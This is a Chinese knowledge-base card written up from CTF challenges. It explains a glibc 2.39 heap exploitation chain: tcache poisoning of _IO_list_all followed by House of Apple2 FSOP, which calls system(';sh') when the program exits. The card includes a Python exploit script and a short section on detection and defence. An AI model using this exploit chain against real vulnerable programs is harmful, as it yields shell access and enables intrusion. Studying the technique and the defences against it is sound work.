---
id: binary-pwn-heap-tcache-poison-io-list-all-house-of-apple2
title: tcache 毒化 _IO_list_all + House of Apple2（glibc 2.39）：堆块合并/UAF 泄堆后伪造 FILE 调 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-poison-io-list-all-house-of-apple2
tags:
- pwn
- heap
- glibc
- tcache
- tcache-poisoning
- io-list-all
- house-of-apple2
- fsop
- wide-data
- ctf
cve: []
severity: high
confidence: medium
status: verified
affected_versions: glibc 2.39（原文 jctfcoin/babyheap 环境：Ubuntu GLIBC 2.39-0ubuntu8.5）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:51:04+08:00'
  notes: 已对照原文 jctfcoin/babyheap 两段核对：堆溢出改 0x421 合并进 unsorted 泄 libc、tcache key 泄 heap、tcache poison _IO_list_all-0x10、_IO_wfile_jumps/wide_vtable+0x68=system 的 House of Apple2 链与两个 exp 片段一致；affected_versions=glibc 2.39 为原文明确环境/适用版本，保留；原文无成功回显，confidence medium 合理。
url: /docs/binary/pwn/heap/binary-pwn-heap-tcache-poison-io-list-all-house-of-apple2/
draft: false
kb_aliases:
- jctfcoin
- babyheap
- tcache 毒化 _IO_list_all
- House of Apple2 glibc 2.39
- _IO_wfile_jumps
- wide_vtable system
- tcache key 泄堆
---

## 一句话结论

在 glibc 2.39 的堆题中，先用 UAF/堆溢出取得堆地址与 libc 地址（tcache key 可还原 heap、unsorted bin 可泄 libc），再用 tcache poisoning 把一次 malloc 投毒到 `_IO_list_all` 附近，把全局 FILE 链表头改成堆上伪造的 `_IO_FILE`；主 vtable 填合法的 `_IO_wfile_jumps` 绕过 `_IO_validate_vtable`，`_wide_data->_wide_vtable + 0x68` 填 `system`，程序 `exit()` 时经 `_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf` 调用 `system(fp)`，其中 `fp->_flags` 放置 `";sh"` 作为命令串，从而拿 shell。

## 原理

- **两种泄堆姿势**：
  - **堆溢出改 size 合并 chunk**（jctfcoin）：`edit` 用户名的写长度按 `*(chunk+8)+0x10` 计算，可越过当前 chunk 覆盖下一个 chunk 的 size；把 size 改成 `0x421` 使 4 个相邻 chunk 被当作一个大块释放/合并进 unsorted bin。再申请切割，show 小 chunk 可读出 unsorted bin 的 `fd/bk` 得到 libc；随后控制被合并的小 chunk 的 fd，借 tcache key 或 fd 编码得到 heap。
  - **UAF + tcache key**（babyheap）：`delete` 只 `free` 不置空，`show` 读回已释放的 0x30 chunk，`+0x8` 的 tcache key（safe-linking 密钥）泄露堆地址（`heap_base = key << 12`），`+0x0` 的 fd 编码用于 tcache poisoning；另用 UAF/unsorted bin 泄 libc。
- **tcache poisoning 到 `_IO_list_all`**：safe-linking 下 tcache 的 `next = PROTECT_PTR(&chunk->fd, target) = (chunk_addr >> 12) ^ target`。把目标设为 `_IO_list_all - 0x10`，连续两次 `malloc` 让第二次返回该地址附近；写入时把 `_IO_list_all` 改成堆上 fake FILE 的地址（或直接让 fake FILE 覆盖 `_IO_list_all` 指向的内存）。
- **House of Apple2 链路**：`_IO_flush_all_lockp` 遍历 `_IO_list_all`；fake FILE 满足 `_mode <= 0` 且 `_IO_write_ptr > _IO_write_base` 后调用 `_IO_OVERFLOW(fp, EOF)`。主 vtable 用合法段内的 `_IO_wfile_jumps`（过 `_IO_validate_vtable`），进入 `_IO_wfile_overflow`；`_wide_data->_IO_write_base == NULL` 时调用 `_IO_wdoallocbuf(fp)`；该函数在 `_wide_data->_IO_buf_base == NULL` 且 `_flags & _IO_UNBUFFERED (0x2) == 0` 时，调用 `*(_wide_data->_wide_vtable + 0x68)(fp)`。把该槽写成 `system`，`fp` 作为第一参数；`_flags` 放 `";sh\0"`（避开 `0x8`/`0x2`/`0x800` 等标志，同时 `system(";sh")` 等价于 `sh`）。
- **版本前提**：glibc 2.39 已有 `IO_validate_vtable`（主 vtable 必须位于 `__libc_IO_vtables` 段），所以不能把主 vtable 指向堆；但 `_wide_data->_wide_vtable` 不在校验范围，仍可指向堆上伪造的跳表。safe-linking 与 tcache key 校验要求先泄露 heap 地址/密钥。
- **为什么成立**：`exit()`/`main` 返回会走 `_IO_cleanup → _IO_flush_all_lockp`，即使程序没有显式 `fclose` 也会遍历全局 FILE 链表；`_IO_list_all` 是普通可写全局变量，一旦被 tcache poisoning 改写，链表首元素就变成攻击者的堆块。

## 触发条件

- glibc 2.39（原文 Ubuntu GLIBC 2.39-0ubuntu8.5）；其他版本需重新确认 `_IO_FILE`/`_IO_wide_data`/`_IO_wfile_jumps` 偏移与校验证策。
- 存在堆漏洞：UAF（free 后 show/edit）或堆溢出（可改下一 chunk 的 size/内容）；能进行 tcache poisoning（写已释放 chunk 的 fd/next）。
- 能泄露 heap（tcache key、fd 编码或 unsorted bin nextsize）与 libc（unsorted bin fd/bk）。
- 程序最终通过 `exit()` 或 main 返回退出；fulfill `_IO_flush_all_lockp` 的遍历条件。
- 需要能写入至少 0x200 字节的 fake FILE/`_IO_wide_data`/fake wide vtable 布局。

## 利用步骤

1. 用堆布局制造 unsorted bin/大块合并，show 泄露 libc 基址；用 tcache key 或 fd 编码还原 heap 基址（jctfcoin 用 `heap_base = (key << 12) - 0x1000`，babyheap 用 `heap_base = key << 12`）。
2. 计算 `_IO_list_all`、`system`、`_IO_wfile_jumps` 地址（libc 偏移按目标 libc）。
3. 准备一个可写堆块作为 fake FILE，另准备 `_IO_wide_data` 与 fake wide vtable：
   - fake FILE `_flags` 处放 `";sh\0"`；
   - `_mode`（+0xc0）= 0、`_IO_write_base`（+0x20）= 0、`_IO_write_ptr`（+0x28）= 1；
   - `_wide_data`（+0xa0）指向 fake `_IO_wide_data`，其 `_IO_write_base`/`_IO_buf_base` 为 NULL，`_wide_vtable` 指向 fake wide vtable；
   - 主 vtable（+0xd8）= `_IO_wfile_jumps`；fake wide vtable + 0x68 = `system`。
4. tcache poisoning：把已释放 chunk 的 next 写成 `PROTECT_PTR(chunk, _IO_list_all - 0x10)`；两次 malloc 后第二次落在 `_IO_list_all - 0x10`，写入时把 `_IO_list_all` 指向 fake FILE（或直接在目标位置布置）。
5. 把 fake FILE 写入对应堆块（jctfcoin 用 add(7)/add(8) 写 payload1/payload2；babyheap 用多次 edit 拼 0x30 块）。
6. 选择退出/触发 `exit()`，`_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf → _wide_vtable+0x68` 调用 `system(";sh")`，拿 shell。

## PoC

jctfcoin 关键片段（原文 exp，地址偏移按该题 libc/堆；远程 heap 偏移比本地多 0x30）：

```python
add(0,0x20,b"A"*8); add(1,0x190,b"B"*8)
add(14,0x20,b"Z"*8); add(15,0x20,b"Z"*8)
add(2,0x1D0,b"C"*8); add(3,0x20,b"D"*8)
edit(0, b"A"*0x28 + p64(0x421))     # 改 size，合并 4 块
dele(1); add(1,0x190,b"B"*8)

show(14); reu(b": "); libc_base = int(re(15),10) - 0x203b20
IO_list_all = libc_base + libc.sym["_IO_list_all"]
io_wfile_jumps = libc_base + libc.sym["_IO_wfile_jumps"]
sys_addr = libc_base + libc.sym["system"]

add(4,0x60,b"A"*8); dele(4)
show(14); reu(b": "); key = int(re(12),10)
heap_base = (key << (8+4)) - 0x1000

add(5,0x20,b"A"); dele(5); dele(15)
edit(14, b"A"*0x28 + p64(0x41) + p64((IO_list_all-0x10)^key))  # tcache poison
add(5,0x20,b"A"*8)
add(6,0x20,p64(heap_base + 0x1710 + 0x30))                     # _IO_list_all -> heap

payload1 = p32(0xfffff7f5) + b";sh\x00" + p64(0)
fake_io_file = p64(0)*2 + p64(0) + p64(1)
fake_io_file += b"\x00"*0x70 + p64(heap_base + 0x1800 + 0x30)
fake_io_file += b"\x00"*0x30 + p64(io_wfile_jumps)
fake_io_file += b"\x00"*(0x10+0xE0) + p64(heap_base + 0x1918 + 0x30)
payload1 += fake_io_file
payload2 = b"\x00"*0x50 + p64(sys_addr)
add(7,0x200,payload1); add(8,0x200,payload2)
sela(b": ", b"6")   # 退出触发 FSOP
```

babyheap 变体（原文队友 exp）用 UAF 写 tcache key 链、`heap_base = key << 12`、同样把 `_IO_list_all` 改为堆地址后用 `_IO_wfile_jumps`/`_wide_vtable`/`system` 布局，最后 `exit()` 触发。原文两个 exp 均未在本机复跑，也没有成功回显截图。

## 变体与关联

- **目标变体**：`[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]` 直接覆盖 `_IO_2_1_stderr_`（glibc 2.35），不需要改 `_IO_list_all`；本卡用 tcache poisoning 改 `_IO_list_all` 指向堆 fake FILE，写入原语与目标不同。
- **写原语变体**：`[[binary-pwn-heap-house-of-apple2-source-analysis-largebin-system]]` 用 largebin attack 改 `_IO_list_all`；`[[binary-pwn-heap-house-of-apple2-chunk-header-svcudp-reply-xdr-ops-orw]]` 用 largebin attack 把 `_IO_list_all` 改到 chunk header 后构造 partial FILE；本卡用 tcache poisoning + chunk 合并/UAF。
- **堆布局变体**：jctfcoin 用“堆溢出改 size 合并 4 块进 unsorted bin”泄 libc/heap；babyheap 用“0x30 UAF + tcache key”泄 heap；两者最终都走 tcache poison `_IO_list_all` + House of Apple2。
- **关联**：`[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]`（UAF 泄 libc）、`[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]`（tcache key/safe-linking 绕过思路）。

## 检测与防御

- **根因修复**：free 后置空指针、校验 edit 长度不超过 chunk 大小、禁止越界改下一 chunk size；对 tcache/fastbin 的 fd/next 做完整性校验（safe-linking、tcache key）。
- **FSOP 防护**：`_IO_list_all` 不应指向堆；对主 vtable 做 `_IO_validate_vtable`（已有）并考虑对 `_wide_data->_wide_vtable` 也做校验；监控 `_IO_wfile_jumps` 被使用且 wide_vtable 指向堆的异常。
- **检测**：`_IO_list_all` 值为堆地址、`_IO_FILE` 的 `_flags` 出现 `";sh"`/`" sh"`、`_wide_data`/`_wide_vtable` 指向堆、进程退出阶段在 `_IO_wdoallocbuf`/`_IO_wfile_overflow` 出现 `system` 调用栈；tcache chunk 的 next 解码后指向 libc 数据段。
- **加固**：升级 glibc 跟进 FSOP 加固；Full RELRO/PIE/Canary 不能阻止 FSOP；堆题中开启 ASLR 并不能阻止“泄堆 + 毒化”组合，关键是消除 UAF/溢出。
